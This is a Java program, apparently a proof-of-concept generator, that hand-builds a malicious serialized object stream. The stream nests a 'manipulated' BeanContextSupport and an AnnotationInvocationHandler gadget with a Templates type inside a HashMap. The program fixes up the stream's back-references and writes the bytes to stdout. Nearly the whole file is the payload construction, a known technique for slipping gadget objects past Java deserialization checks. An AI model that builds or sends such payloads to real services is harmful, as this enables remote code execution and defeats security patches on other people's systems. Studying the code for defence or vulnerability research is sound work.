import static java.io.ObjectStreamConstants.STREAM_MAGIC;
import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_BLOCKDATA;
import static java.io.ObjectStreamConstants.TC_CLASS;
import static java.io.ObjectStreamConstants.TC_CLASSDESC;
import static java.io.ObjectStreamConstants.TC_ENDBLOCKDATA;
import static java.io.ObjectStreamConstants.TC_NULL;
import static java.io.ObjectStreamConstants.TC_OBJECT;
import static java.io.ObjectStreamConstants.TC_PROXYCLASSDESC;
import static java.io.ObjectStreamConstants.TC_REFERENCE;
import static java.io.ObjectStreamConstants.TC_STRING;
import static java.io.ObjectStreamConstants.baseWireHandle;

import java.beans.beancontext.BeanContextChildSupport;
import java.beans.beancontext.BeanContextSupport;
import java.io.File;
import java.io.FileInputStream;
import java.io.PrintStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import javax.xml.transform.Templates;

public class BCSSerializationTest
{
  public static void main (String [] args)
	throws IOException
  {
    @SuppressWarnings("rawtypes")
    Map map = new HashMap ();
    
    Object[] stream = new Object [] {
        STREAM_MAGIC, STREAM_VERSION,            
        TC_OBJECT,
        TC_CLASSDESC,
        HashMap.class.getName(),
        0x0507dac1c31660d1L,
        (byte) 3,
        (short) 2,
        (byte) 'F', "loadFactor",
        (byte) 'I', "threshold",
        TC_ENDBLOCKDATA,
        TC_NULL,
        0x3f400000,
        0xc,
        TC_BLOCKDATA,
        (byte)8,
        0x10,
        1,
        /*
         *  Begin of manipulated BeanContextSupport
         */
        TC_OBJECT,
        TC_CLASSDESC,
        BeanContextSupport.class.getName(),
        0xbc4820f0918fb90cL,
        (byte) 3,
        (short) 4,
        (byte) 'Z', "designTime",
        (byte) 'Z', "okToUseGui",
        (byte) 'I', "serializable",
        (byte)'L',"locale", TC_STRING, "Ljava/util/Locale;",
        TC_ENDBLOCKDATA,
        TC_CLASSDESC,
        BeanContextChildSupport.class.getName(),
        0x57d4efc704dc7225L,
        (byte) 3,
        (short) 3,
        (byte)'L',"beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
        (byte)'L',"pcSupport", TC_STRING, "Ljava/beans/PropertyChangeSupport;",
        (byte)'L', "vcSupport", TC_STRING, "Ljava/beans/VetoableChangeSupport;",
        TC_ENDBLOCKDATA,
        TC_NULL,
        TC_REFERENCE, baseWireHandle + 6,
        TC_OBJECT,
        TC_CLASSDESC,
        "java.beans.PropertyChangeSupport",
        0x58d5d264574860bbL,
        (byte) 3,
        (short) 3,
        (byte) 'I', "propertyChangeSupportSerializedDataVersion",
        (byte)'L',"children", TC_STRING, "Ljava/util/Hashtable;",
        (byte)'L',"source", TC_STRING, "Ljava/lang/Object;",
        TC_ENDBLOCKDATA,
        TC_NULL,
        2,
        TC_NULL,
        TC_REFERENCE, baseWireHandle + 6,
        TC_NULL,
        TC_ENDBLOCKDATA,
        TC_OBJECT,
        TC_CLASSDESC,
        "java.beans.VetoableChangeSupport",
        0xb95bf022ca752f3fL,
        (byte) 3,
        (short) 3,
        (byte) 'I', "vetoableChangeSupportSerializedDataVersion",
        (byte)'L', "children", TC_REFERENCE, baseWireHandle + 8,
        (byte)'L', "source", TC_REFERENCE, baseWireHandle + 9,
        TC_ENDBLOCKDATA,
        TC_NULL,
        2,
        TC_NULL,
        TC_REFERENCE, baseWireHandle + 6,
        TC_NULL,
        TC_ENDBLOCKDATA,
        TC_ENDBLOCKDATA,
        (byte) 0,
        (byte) 1,
        1,
        TC_OBJECT,
        TC_CLASSDESC,
        "java.util.Locale",
        0x7ef811609c30f9ecL,
        (byte) 3,
        (short) 6,
        (byte) 'I', "hashcode",
        (byte)'L', "country", TC_STRING, "Ljava/lang/String;",
        (byte)'L', "extensions", TC_REFERENCE, baseWireHandle + 0xe,
        (byte)'L', "language", TC_REFERENCE, baseWireHandle + 0xe,
        (byte)'L', "script", TC_REFERENCE, baseWireHandle + 0xe,
        (byte)'L', "variant", TC_REFERENCE, baseWireHandle + 0xe,
        TC_ENDBLOCKDATA,
        TC_NULL,
        -1,
        TC_STRING, "US",
        TC_STRING, (short)0,
        TC_STRING, "en",
        TC_REFERENCE, baseWireHandle + 0x11,
        TC_REFERENCE, baseWireHandle + 0x11,
        TC_ENDBLOCKDATA,
        TC_OBJECT,
        TC_CLASSDESC,
        "sun.reflect.annotation.AnnotationInvocationHandler",
        6182022883658399397L,       // serialVersionUID
        (byte) 3,
        (short) 2,                  // field count
        (byte) 'L', "type", TC_STRING, "Ljava/lang/Class;",         // type field
        (byte) 'L', "memberValues", TC_STRING, "Ljava/util/Map;",   // memberValues field
        TC_ENDBLOCKDATA,
        TC_NULL,                    // no superclass
        Templates.class,            // type field value
        map, // memberValues field value
        TC_BLOCKDATA, (byte)4, 0,
        TC_ENDBLOCKDATA,
        /*
         * End of manipulated BeanContextSupport
         */
        TC_REFERENCE,
        baseWireHandle + 24,
        TC_ENDBLOCKDATA
    };
            
    byte [] toBytes = util.Converter.toBytes (stream);
    /*
     *  First patch references of BCS: Everything +2
     */
    for (int i = 81; i < 973; i++) {
      if (toBytes[i] == 0x71 && toBytes[i+1] == 0x00 && toBytes[i+2] == 0x7e && toBytes[i+3] ==0x00) {
	i = i + 4;
	System.err.print("Adjusting reference from: " + toBytes[i]);
	if (toBytes[i] ==  6) toBytes[i] = 8;      
	else if (toBytes[i] ==  8) toBytes[i] = 10;
	else if (toBytes[i] ==  9) toBytes[i] = 11; 
	else if (toBytes[i] == 14) toBytes[i] = 16;  
	else if (toBytes[i] == 17) toBytes[i] = 19;     
	System.err.println(" to: " + toBytes[i]);
      }
    }
    new PrintStream (System.out).write (toBytes, 0,
            toBytes.length);
  }
}
